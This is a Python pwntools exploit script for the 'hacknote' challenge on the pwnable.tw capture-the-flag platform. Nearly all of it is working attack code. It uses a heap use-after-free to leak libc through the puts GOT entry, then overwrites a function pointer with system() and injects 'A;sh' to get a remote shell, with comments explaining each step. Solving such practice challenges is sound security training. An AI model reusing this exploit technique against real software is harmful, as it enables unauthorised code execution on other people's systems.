#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe
note_index: int = 0
gdbscript = """
                break *0x8048918
            """

def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("chall.pwnable.tw", 10102)

    return r


def alloc(size: int, data: bytes) -> int:
    global note_index

    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"size :", str(size).encode("ascii"))
    r.sendafter(b"Content :", data)

    note_index += 1
    return note_index - 1


def free(index: int):
    r.sendlineafter(b"choice :", b"2")
    r.sendlineafter(b"Index :", str(index).encode("ascii"))


def print_note(index: int, for_leak: bool = True):
    r.sendlineafter(b"choice :", b"3")
    r.sendlineafter(b"Index :", str(index).encode("ascii"))
    
    if for_leak:
        return r.recvline().strip()


def main():
    r = conn()

    # By allocating a note, the program allocates two chunks: one is always of size 0x10,
    # the other is of an arbitrary size. In this case the size is 0x20.
    A = alloc(0x18, b"A" * 0x18)
    B = alloc(0x18, b"B" * 0x18)

    # Free both chunks (we are interested in those of size 0x10) for the UAF
    free(A)
    free(B)

    # Use-After-Free: we change the content chunk's address to `puts()` to leak libc
    C = alloc(0x8,  p32(0x804862b) + p32(exe.got.puts))

    libc.address = u32(print_note(A)[:4]) - libc.sym.puts
    log.info(f"libc @ 0x{libc.address:x}")

    # Free third chunk to reuse it so we can overwrite "print_content" with `system()`
    free(C)

    # Since "print_content" will put the address of next dword onto the stack, we overwrite
    # it with the command we want to execute. Since we have 4 bytes left and `system()` can't
    # execute "sh" (i don't know why), we use the trick to execute a bad command splitted by ';'
    # so it will execute "sh" afterwards.
    D = alloc(0x8, p32(libc.sym.system) + b"A;sh")

    # By printing note A we will trigger `system()`, which will execute the string
    # immediately after it in the chunk.
    print_note(A, for_leak = False)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
